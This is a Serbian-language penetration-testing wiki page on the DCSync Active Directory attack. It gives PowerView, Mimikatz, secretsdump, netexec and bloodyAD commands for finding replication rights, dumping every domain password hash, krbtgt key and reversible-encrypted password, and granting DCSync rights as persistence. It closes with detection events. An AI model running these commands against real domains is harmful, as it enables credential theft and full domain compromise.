# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Dozvola **DCSync** podrazumeva posedovanje sledećih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Važne napomene o DCSync-u:**

- **DCSync napad simulira ponašanje Domain Controller-a i traži od drugih Domain Controller-a da repliciraju informacije** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR važeća i neophodna funkcija Active Directory-ja, ne može se isključiti niti onemogućiti.
- Podrazumevano, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
- U praksi, za **full DCSync** potrebne su dozvole **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** nad kontekstom imenovanja domena. Dozvola `DS-Replication-Get-Changes-In-Filtered-Set` se često delegira zajedno s njima, ali je sama po sebi relevantnija za sinhronizaciju **poverljivih / RODC-filtered atributa** (na primer, tajni podataka u starijem LAPS stilu) nego za potpuni krbtgt dump.<sup>[[2]](#references)</sup>
- Ako su lozinke nekih naloga uskladištene uz reverzibilno šifrovanje, u Mimikatz-u postoji opcija za prikaz lozinke u čistom tekstu.

### Enumeracija

Proverite ko ima ove dozvole pomoću `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Ako želite da se usredsredite na **principal-e koji nisu podrazumevani** i imaju DCSync prava, izostavite ugrađene grupe koje mogu da obavljaju replikaciju i pregledajte samo neočekivane nosioce prava:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Eksploatišite lokalno

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Eksploatacija na daljinu

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktični primeri ograničenog opsega:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync korišćenjem uhvaćenog TGT-a računara DC-a (ccache)

Pri proveri servisa na kontroleru domena razlikujte njegov lokalni identitet servisa od mrežnog identiteta. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) da virtuelni nalozi SQL Server-a (`NT SERVICE\...`) pristupaju mrežnim resursima koristeći nalog računara hosta. Na kontroleru domena to može učiniti nalog računara DC-a relevantnim za proveru prava replikacije, ali sam foothold na servisu ne potvrđuje da postoji izvoziv TGT računara niti da su dostupni podaci za autentifikaciju upotrebljivi za DCSync. Proverite stvarni identitet servisa, kontekst odlazne autentifikacije, dostupne tikete ili kredencijale i efektivna prava replikacije pre nego što ovo smatrate mogućim putem.

U scenarijima unconstrained-delegation export-mode možete uhvatiti TGT računara Domain Controller-a (npr. `DC1$@DOMAIN` za `krbtgt@DOMAIN`). Zatim možete koristiti taj ccache za autentifikaciju kao DC i izvršiti DCSync bez lozinke.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operativne napomene:

- **Impacket-ov Kerberos put prvo dodiruje SMB** pre DRSUAPI poziva. Ako okruženje sprovodi **SPN target name validation**, full dump možda neće uspeti uz poruku `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- U tom slučaju, prvo zatražite servisnu kartu **`cifs/<dc>`** za ciljni DC ili se odmah ograničite na nalog koji vam je potreban pomoću opcije **`-just-dc-user`**.
- Kada imate samo ograničena prava replikacije, sinhronizacija u stilu LDAP/DirSync i dalje može da otkrije **poverljive** atribute ili atribute **filtrirane za RODC** (na primer, zastareli `ms-Mcs-AdmPwd`) bez potpune replikacije krbtgt naloga.<sup>[[2]](#references)</sup>

`-just-dc` generiše 3 fajla:

- jedan sa **NTLM hash vrednostima**
- jedan sa **Kerberos ključevima**
- jedan sa lozinkama u čistom tekstu iz NTDS-a za sve naloge kod kojih je omogućena opcija [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Korisnike sa omogućenom opcijom reversible encryption možete dobiti pomoću

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Ako ste administrator domena, pomoću PowerView možete da dodelite ove dozvole bilo kom korisniku:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux operateri mogu isto da urade pomoću `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Zatim možete **proveriti da li su korisniku ispravno dodeljene** 3 privilegije tako što ćete ih potražiti u izlazu (trebalo bi da možete da vidite nazive privilegija u polju "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Ublažavanje

- Security Event ID 4662 (mora biti omogućena Audit Policy za objekat) – Izvršena je operacija nad objektom<sup>[[4]](#references)</sup>
- Security Event ID 5136 (mora biti omogućena Audit Policy za objekat) – Objekat directory service-a je izmenjen
- Security Event ID 4670 (mora biti omogućena Audit Policy za objekat) – Dozvole za objekat su promenjene
- AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ovima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket dnevnik izmena](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Korišćenje prava Replication Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Preuzimanje hash vrednosti lozinki sa domain controller-a](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL kredencijali → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
